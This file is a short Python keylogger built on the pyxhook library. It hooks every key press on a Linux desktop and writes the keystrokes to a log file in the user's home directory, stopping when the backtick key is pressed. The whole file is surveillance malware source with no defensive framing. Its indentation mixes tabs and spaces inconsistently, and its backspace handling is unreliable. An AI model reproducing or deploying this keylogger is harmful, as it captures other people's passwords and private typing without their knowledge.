import pyxhook
import os.path
homedir = os.path.expanduser('~')
log_file=homedir+'/HookMyKeys/HookMyKeys.log' #this is the path of log file

def KeyPress(event):
  logfile=open(log_file,'a')
  if event.Ascii==32 or event.Key=='Tab':
  	logfile.write(' ')
  elif event.Key=='Return':
	logfile.write('\n')
	
  elif event.Key=='BackSpace':
	size=logfile.tell()
	logfile.truncate(size-1)
  elif event.Ascii==96:
	logfile.write('\n')
	logfile.close()
    	hooked.cancel()
  else:
	logfile.write(event.Key)

hooked=pyxhook.HookManager()
hooked.KeyDown=KeyPress
hooked.HookKeyboard()
hooked.start()
